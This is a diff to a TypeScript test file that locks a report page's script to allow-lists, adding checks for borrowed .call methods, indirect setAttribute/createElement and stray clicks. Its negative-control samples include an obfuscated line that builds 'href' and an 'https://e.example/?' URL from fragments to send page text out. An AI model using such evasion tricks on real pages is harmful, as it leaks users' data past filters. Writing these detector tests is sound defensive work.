@@ -1,4 +1,4 @@
-// cspell:words beforeprint afterprint
+// cspell:words beforeprint afterprint ttps
 /**
  * The report's one script: what it must never contain, and what it does.
  *
@@ -85,6 +85,12 @@ const ALLOWED_HREF_LINES = [
 /** The only statements that may add or remove an element: the export's temporary link. */
 const ALLOWED_TREE_CHANGES = ["document.body.appendChild(a);", "document.body.removeChild(a);"];
 
+/** The only object whose method the script may borrow with `.call`. */
+const ALLOWED_CALL = "Array.prototype.forEach";
+
+/** The only statement that may click an element: the export's temporary link. */
+const ALLOWED_CLICKS = ["a.click();"];
+
 /** The attributes the script may set, and the one element it may create. */
 const SETTABLE_ATTRIBUTES = new Set(['"data-theme"', '"aria-pressed"', '"data-over"']);
 const CREATABLE_ELEMENTS = new Set(['"a"']);
@@ -125,6 +131,30 @@ function scriptViolations(source: string): string[] {
 
   for (const m of code.matchAll(/\.\s*([A-Za-z_$][\w$]*)/g)) {
     if (!ALLOWED_PROPERTIES.has(m[1] ?? "")) out.push(`property .${m[1]}`);
+  }
+  // A borrowed method runs with any receiver, so only the one known borrow is allowed.
+  for (const m of code.matchAll(/([\w$.\s]*?)\.\s*call\b/g)) {
+    if (
+      (m[1] ?? "")
+        .replace(/\s+/g, "")
+        .split(/[^\w$.]/)
+        .pop() !== ALLOWED_CALL
+    ) {
+      out.push(`borrowed call: ${(m[0] ?? "").trim()}`);
+    }
+  }
+  // These two are checked by their arguments below, so they may only be called directly.
+  for (const m of code.matchAll(/\b(setAttribute|createElement)\b(?!\s*\()/g)) {
+    out.push(`indirect ${m[1]}`);
+  }
+  for (const line of code.split("\n").map((l) => l.trim())) {
+    if (
+      /\bclick\b/.test(line) &&
+      !/\.addEventListener\(""/.test(line) &&
+      !ALLOWED_CLICKS.includes(line)
+    ) {
+      out.push(`click: ${line}`);
+    }
   }
   for (const [label, pattern] of BANNED_CODE) {
     if (pattern.test(code)) out.push(label);
@@ -217,6 +247,15 @@ describe("the script stays inside its allow-lists", () => {
     ["replacing the rows", "list.replaceChildren(row);"],
     ["appending a row", "list.append(row);"],
     ["creating another element", 'document.createElement("img");'],
+    ["a borrowed setAttribute", 'shareLink.setAttribute.call(shareLink, "src", u);'],
+    ["a borrowed createElement", 'var el = document.createElement.call(document, "iframe");'],
+    ["a click on another element", "shareLink.click();"],
+    [
+      "a built attribute name through a borrowed call",
+      'var k = "hr" + "ef"; shareLink.setAttribute.call(shareLink, k, "h" + "ttps" + ":" + "/" + "/e.example/?" + data.textContent);',
+    ],
+    ["a stored setAttribute", "var set = el.setAttribute; set(name, u);"],
+    ["another borrowed method", "Array.prototype.map.call(rows, f);"],
   ];
 
   it.each(TAMPERED)("negative control — %s is reported", (_label, statement) => {
